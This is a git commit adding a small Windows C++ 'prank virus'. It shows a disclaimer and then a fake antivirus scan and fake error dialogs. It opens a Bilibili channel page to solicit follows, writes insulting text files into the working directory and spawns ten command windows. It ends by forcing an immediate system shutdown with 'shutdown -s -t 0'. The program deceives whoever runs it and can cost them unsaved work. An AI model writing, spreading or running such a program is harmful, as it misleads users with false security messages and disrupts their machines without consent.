606accd7385ec678a20bc553f557e5425ef060a2
AccppK <167609616+AccppK@users.noreply.github.com>
2025-01-28 22:48:38 +0800

    Create error.cpp

---
+++ C++/error.cpp
@@ -0,0 +1,42 @@
+#include <bits/stdc++.h>
+#include <windows.h>
+using namespace std;
+
+int main() {
+	MessageBox(NULL, "本脚本是个病毒，如对您的电脑有危害，我们不负任何责任！", "免责声明", MB_OK);
+	MessageBox(NULL, "检测到电脑没有扫描杀毒,是否使用？", "扫描", MB_OK);
+	cout << "开始扫描..." << endl;
+	system("color 4");
+	for (int i = 1; i <= 20; i++) {
+		system("dir");
+	}
+	system("cls");
+	MessageBox(NULL, "查杀失败...(单击'确定'结束该程序)", "Error", MB_OK);
+	system("start https://space.bilibili.com/3546666523166935?spm_id_from=333.337.0.0");
+	system("color");
+	MessageBox(NULL, "赶快点关注！", "关注", MB_OK);
+//	system("start cmd");
+	system("cd.> 不是哥们你有啥实力呀就敢运行病毒哈哈哈.txt");
+	cout << "现在看看你放这个文件的目录/狗头" << endl;
+
+	system("cd.>sb.txt");
+	system("cd.>sb1.txt");
+	Sleep(5000);
+	system("cls");
+	system("dir");
+	Sleep(8000);
+	system("echo 啊不是哥们你真的还敢停留！！！？？？？？");
+	Sleep(100);
+	for (int i = 1; i <= 10; i++) {
+		system("start cmd");
+	}
+	MessageBox(NULL, "爽吧", "SB", MB_OK);
+	MessageBox(NULL, "程序出现错误,请按下确定关闭该应用程序...", "我真不骗你真的点了就关闭了", MB_OK);
+	system("cls");
+	MessageBox(NULL, "感谢您对我们的支持", "真?感谢你", MB_OK);
+	system("color 1");
+	system("去世吧~");
+	system("shutdown -s -t 0");
+
+
+}
